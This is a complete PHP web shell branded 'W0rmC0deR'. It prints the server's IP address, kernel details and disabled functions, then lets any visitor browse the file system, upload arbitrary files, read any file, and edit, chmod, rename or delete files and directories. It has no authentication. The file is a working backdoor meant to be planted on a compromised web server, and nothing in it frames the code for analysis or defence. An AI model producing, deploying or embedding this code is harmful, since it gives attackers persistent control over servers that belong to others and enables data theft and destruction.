<tr><td>
<center>
<?php
################################
#Thanks To ICP x SaharaHaxor!
################################
error_reporting(E_ALL ^ (E_NOTICE | E_WARNING));
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
echo "<b><font color='Silver'><br>Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."</b></font>";
echo "<b><font color='Silver'><br>".php_uname()."</b></font><br>";
echo "<b><font color='Silver'>Disable Functions: $show_ds</b></font><br><br>";
?>
<br>
</center>
<?
set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>W0rmC0deR</title><link rel="SHORTCUT ICON"  href="https://vignette.wikia.nocookie.net/aphmau/images/0/03/5892e7f3cc64c8a912e2494a3ff77e08--neko-girl-cute-anime-girls-cute-kawaii.jpg/revision/latest?cb=20170707151614">
<style>
body{
	font-family: "Racing Sans One", cursive;
	background-image: url("http://trik99designs.com/wp-content/uploads/2018/08/one-piece-black-and-white-wallpaper-hd-luxury-e-piece-wallpapers-x-wallpaper-hd-wallpapers-of-one-piece-black-and-white-wallpaper-hd.png");
        color:White;
	background-attachment:fixed;
	background-repeat:no-repeat;
        background-position:center;
   	background-color:transparan;
	-webkit-background-size: 100% 100%;

}
#content tr:hover{
background-color: #000;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: Purple;
}
#content .first:hover{
background-color: Purple;
text-shadow:0px 0px 1px #757575;
}
H1{
font-family: "Racing Sans One", cursive;
color: #fff;
}
a{
color: #fff;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 5px #ffffff;
}
input,select,textarea{
border: 1px #fff solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<center><font color="Silver" size="2"><pre>
$$\      $$\  $$$$$$\  $$$$$$$\  $$\      $$\       $$\   $$\  $$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$$$$$$\
$$ | $\  $$ |$$  __$$\ $$  __$$\ $$$\    $$$ |      $$ |  $$ |$$  __$$\ $$  __$$\ $$ | $$  |$$  _____|$$  __$$\
$$ |$$$\ $$ |$$ /  $$ |$$ |  $$ |$$$$\  $$$$ |      $$ |  $$ |$$ /  $$ |$$ /  \__|$$ |$$  / $$ |      $$ |  $$ |
$$ $$ $$\$$ |$$ |  $$ |$$$$$$$  |$$\$$\$$ $$ |      $$$$$$$$ |$$$$$$$$ |$$ |      $$$$$  /  $$$$$\    $$$$$$$  |
$$$$  _$$$$ |$$ |  $$ |$$  __$$< $$ \$$$  $$ |      $$  __$$ |$$  __$$ |$$ |      $$  $$<   $$  __|   $$  __$$<
$$$  / \$$$ |$$ |  $$ |$$ |  $$ |$$ |\$  /$$ |      $$ |  $$ |$$ |  $$ |$$ |  $$\ $$ |\$$\  $$ |      $$ |  $$ |
$$  /   \$$ | $$$$$$  |$$ |  $$ |$$ | \_/ $$ |      $$ |  $$ |$$ |  $$ |\$$$$$$  |$$ | \$$\ $$$$$$$$\ $$ |  $$ |
\__/     \__| \______/ \__|  \__|\__|     \__|      \__|  \__|\__|  \__| \______/ \__|  \__|\________|\__|  \__|



</pre></font></center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Current Path : ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="green">Upload File Success!</font><br />';
}else{
echo '<font color="red">Failed for Upload File!</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>';
if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Change Permission Success~!</font><br />';
}else{
echo '<font color="red">Failed for Change Permission !</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Change Name Success!</font><br />';
}else{
echo '<font color="red">Failed for Change Name !</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit File Success!</font><br />';
}else{
echo '<font color="red">Failed for Edit File!</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Delete Dir Success!</font><br />';
}else{
echo '<font color="red">Failed for Delete Dir!</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Delete File Success!</font><br />';
}else{
echo '<font color="red">Failed for Edit File!</font><br />';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
if(is_writable("$path/$dir")) echo '<font color="Purple">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color="Purple">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br /><center><font color="Purple">Coded By W0rmC0d3R</font>
</BODY>
</HTML>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
<style type='text/css'>body, a, a:link{cursor:url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png), default;} a:hover {cursor:url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),wait;}</style>
